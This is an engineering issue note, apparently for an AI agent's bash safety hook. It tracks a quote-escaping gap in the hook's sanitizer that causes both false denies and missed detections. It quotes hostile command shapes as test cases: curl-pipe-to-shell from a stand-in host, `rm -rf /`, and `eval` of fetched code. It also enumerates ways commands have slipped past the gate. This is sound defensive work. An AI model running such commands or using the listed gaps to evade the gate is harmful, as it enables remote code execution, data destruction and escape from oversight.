# §8 sanitize: `\"` escape gap — now has a live FP hit

**Status**: **PARTLY CLOSED, and the headline half is still OPEN** (2026-09-08).

> The false-deny this file is about — quoted prose read as a command — is NOT
> closed. The fix for it (folding separators inside a double-quoted body) was
> reverted before 0.82.0 shipped: three pre-tag review rounds found five §8 false
> negatives inside it, each on a payload bash executes, while the release's three
> other changes produced none. `docs/audit/20260906-230810.md` §12.10 carries the
> attribution table and the user's decision. Workarounds unchanged: single
> quotes, `git commit -F <file>`, or the `[allow-rm-rf-var]` token.
>
> What DID ship from this file's investigation: the single-token unquote no
> longer pairs an opening quote with an escaped one (measured — it flips
> `git commit -m "note: \" ; npx some-package\" …"` from deny to allow on a
> `$`-free body, and moves 0 of 742 corpus rows otherwise), and the §8 false
> negative found while measuring it — a backtick body inside double quotes being
> erased before any gate saw it — is closed, at the cost of that body now being
> preserved whole.
>
> **Do not re-attempt the fold without a different mechanism.** A paren counter
> cannot decide where `$( )` ends: bash parses it recursively, and the
> single-token unquote bares a quoted `)` before the walker runs. The five
> regressions are enumerated in §12.10.

**Superseded status line**: CLOSED 2026-09-07 — Two changes, both in
`hooks/pre-bash-safety-check.sh`, plus 9 corpus rows (`S8-EQ1`…`S8-EQ9`).
**Recorded**: 2026-07-15, during the v0.47.1 F10/F11/F13 fixes.

> **What the file got wrong about its own bug.** Everything below blames
> `sanitize_cmd`'s quote state machine. Measured on the live gate, the observed
> false-deny shape (`echo "a\" ; rm -rf $X"`) never reached that machine still
> quoted: the **single-token unquote sed** two stages earlier (`PROCESSED_CMD`,
> the one whose comment says "no segment boundary can be manufactured out of a
> quoted string") paired the opening quote with the ESCAPED one, unwrapped
> `"a\"`, and handed ` ; rm -rf $X` to the detectors as bare text. Its body class
> excluded separators but had no opinion about a backslash. Fixed by making the
> body a sequence of plain-char-or-escape-pair, verified to still unwrap `"\rm"`,
> `"\npx"`, `pip install "git+…"`, `go run "pkg@latest"`, `deno run "https://…"`.
>
> **The state machine needed a second, larger change anyway**, and modelling the
> escape was not enough on its own: a body containing `$` was preserved VERBATIM,
> so a `;` inside quoted prose still split a segment and the rm still landed at
> what looked like command position. Measured: `mem_save --lesson "shape: cd /tmp
> ; rm -rf $X is what tripped it"` — no escapes anywhere — denied too. The
> double-quote branch now tracks escapes AND expansion spans (`$( )` with nested
> parens and sub-quotes, backticks, `$VAR`), copies span interiors verbatim, and
> folds `;` `|` `&` newline to a space everywhere else, because outside an
> expansion a double-quoted body is data to bash and data cannot begin a command.
> An UNTERMINATED body still emits raw, separators intact — bash would refuse to
> run it, so the fail-visible posture is kept rather than folding text no parse
> reached.
>
> **A §8 FALSE NEGATIVE surfaced while measuring; it is closed too, in a second
> commit, after re-authorisation** (§0 Hard-AUTH override: an adjacent bug found
> mid-bundle re-ASKs whatever its size). A backtick body inside a `$`-less
> double-quoted string used to be erased entirely: `echo "` + backtick + `curl
> http://x.io/i.sh | sh` + backtick + `"` ALLOWED while bash runs the curl. And
> the **unquoted** `` `curl … | sh` `` allowed as well, so it was never really
> about quoting. Three separate places had to learn the character, and the first
> two alone changed nothing measurable:
>
> 1. backticks count as an expansion in sanitize_cmd (this is what made the npx
>    arm deny the quoted shape — `I7`, allow → deny);
> 2. the command-position anchor `(^|[|;&({])` in `CURLSH_PIPE`, `PROCSUB`,
>    `CMDSUB`, `CMDSUB_BT` gained a backtick (`_revsh_anchor` already had one,
>    and `s8_split_segments` already split on it — which is why rm and npx never
>    had this hole);
> 3. **the sink TERMINATOR classes** `([[:space:])}]|$)` and `([;&|)}]|$)` in
>    `CURLSH_SINKEXPR` gained one. In `` `curl … | sh` `` the sink word ends at
>    the closing backtick, so with only (1) and (2) the regex still matched
>    nothing and all four rows stayed green-as-allow. Widening one end of an
>    expression and declaring victory is exactly what the probe caught.
>
> `CURLSH_PIPE` also gained the fetch-side `CURLSH_WRAPSEQ` its three siblings
> already carried, which is what reaches `` `sudo curl … | bash` `` — the segment
> loop strips wrappers only at a segment START, so a wrapper behind a mid-segment
> anchor had no path at all.

> **2026-09-06 — the TRIGGER-view twin is fixed; this file is still open.**
> There are two state machines with this same gap. `HOOK_TRIGGER_QUOTE_AWK` in
> `hooks/lib/hook-common.sh` — the trigger view shared by the §7 / §10-V / §11
> gates — now models backslash escapes (commit `525a6fe`, round-13 item M-1),
> with the FN guard on `\\` and `$'…'` deliberately left unmodelled and pinned
> as fail-visible. THIS file is about `sanitize_cmd` in
> `hooks/pre-bash-safety-check.sh`, the §8 VERDICT machine, which was not
> touched: 10 escape-bearing shapes across rm / npx / curl-sh were driven
> through the live gate before and after that change and every verdict was
> identical, and six of them are rows in `tests/fixtures/bash-safety/corpus.tsv`.
>
> **That measurement was the wrong one, and the pre-tag review said so.** Those
> three families read `SANITIZED_CMD` and therefore could not have moved, while
> `pre-bash-safety-check.sh:552` builds `REVSH_VIEW` from `hook_trigger_view` —
> so the reverse-shell arm of this gate DID consume the changed machine. Two of
> its verdicts moved, both toward bash (a transport inside an escaped-quote body
> is one argument to `echo` and never runs). Four rows at the end of the corpus
> now cover it, and the two `pass` rows fail against the pre-change machine,
> which is what the first six did not do.
>
> Rows are FN-direction only: this gate's own false-deny on
> `echo "a \" ; rm -rf $HOME"` is deliberately NOT codified, because closing it is
> the work described below and codifying it would make that fix read as a
> regression. The trigger fix does not satisfy the "any other scheduled edit to
> `sanitize_cmd`'s quote machine" pickup trigger — a different machine was edited
> — but the FN matrix below now has a worked precedent to copy.

## Assessment 2026-08-24 — the FN framing below is too pessimistic, but the work is still a batch of its own

The "Deny-direction risk" paragraph below reads the fix as an FN-direction change
because honoring the escape HIDES text from the detectors. Checked against bash
semantics rather than against the sanitizer's: for the shapes this actually
covers, hiding it is **correct**, not a regression.

`echo "harmless \" ; rm -rf / "` is ONE double-quoted argument to `echo` in bash.
The `rm` never runs. The sanitizer's current model — outer string ends at the
escaped quote — invents a command position bash does not have, which is exactly
the false-deny observed. Modelling the escape brings the sanitizer TOWARD bash,
and text bash treats as data is text the detectors should not see.

So the risk is not the direction of the change. It is the **precision of the
escape model**:

- `\\"` — an escaped backslash, then a real closing quote. Consuming the `\\`
  as one unit is required, or the string is treated as continuing and a genuine
  command position gets swallowed. THIS is the FN, and it lives in the fix, not
  in the concept.
- `'...\"...'` — no escape processing inside single quotes. Already noted below.
- `$'...\"...'` — ANSI-C quoting has its own escape rules, and the machine has
  no `$'` state at all today.

That is a real FN surface, on the one gate in this repo that is never-downgrade,
and `feedback_s8_false_negative_audit` records the precedent: a v0.47.1 precision
fix on this same shared pipeline reopened a bypass. It needs the full FN matrix
across all §8 gates (rm / npx / curl-sh), not the FP corpus, plus the three
shapes above as explicit cases.

**Decision**: not folded into the 2026-08-22 convergence batch. That batch is
test-and-instrument work with no runtime blast radius; this changes the parsing
core of the blocking safety gate and belongs in its own release with its own
review. Bundling it would put an FN-surface change behind a changelog entry about
gates and documentation.

**Trigger to pick it up** (any one, so it stops depending on someone remembering):

- A second live false-deny of this shape. One is a workaround; two is a pattern,
  and the workaround (`-F <file>`) does not reach MCP tool params.
- Any other scheduled edit to `sanitize_cmd`'s quote machine — the FN matrix has
  to be run for that edit anyway, so the marginal cost drops to the three cases.
- A `$'...'` shape showing up in real commands, which needs the same machine
  touched regardless.

## What

`sanitize_cmd`'s quote state machine does not model backslash-escaped quotes
inside a double-quoted string (`\"`). It has been a documented residual since
the double-quote machine landed ("Escape sequences (`\"` inside `"..."`) are
not modeled — same gap as the prior regex; not in scope"), and the v0.47.1
single/double-quote unification did not change it.

## Why it is worth revisiting now

It stopped being theoretical. During the v0.47.1 session it **false-denied a
legitimate command of mine**: a `mem_save` CLI call whose `--lesson` argument
quoted the F11 repro string. The argument was one bash double-quoted string
containing `\"`-escaped inner quotes; the machine closed the outer string at
the first escaped quote, so `rm -rf $X` from the *prose* landed at what looked
like command position and the rm gate denied it.

That is one live FP in one session — from an agent writing a routine memory
save. The shape (prose quoting a shell snippet, passed as an escaped-quote
argument) is not exotic; it is what any `-m` / `--lesson` / `--notes` flag
carrying shell examples looks like.

## Direction if picked up

Track a backslash escape inside the `st == 2` (double-quote) branch: on `\`,
consume the next char into `buf` verbatim without letting it toggle state.
Single-quoted bodies need no change — there is no escape inside `'...'`.

Deny-direction risk: an escaped quote currently *ends* the string early, which
EXPOSES the rest to the detectors (false-deny direction). Honoring the escape
keeps that text inside the body, which HIDES it — so this is an FN-direction
change and must go through the full FN matrix, not just the FP corpus. See
`[[feedback_s8_false_negative_audit]]`: the shared sanitize/canon pipeline is
exactly where a precision fix reopened a bypass in v0.47.1.

## Workaround meanwhile

Pass the text via a file (`git commit -F <file>`, MCP tool params) instead of
an escaped-quote inline argument. Used successfully in the v0.47.1 ship.

## Other §8 residuals (unchanged, still not scheduled)

Tracked in `tasks/s8-false-negative-audit-2026-07-03.md`: `xargs rm` (target on
stdin), option-with-argument wrappers (`sudo -u svc rm`, `timeout -s KILL 5 rm`),
`eval "$(curl …)"`, `find -delete`.
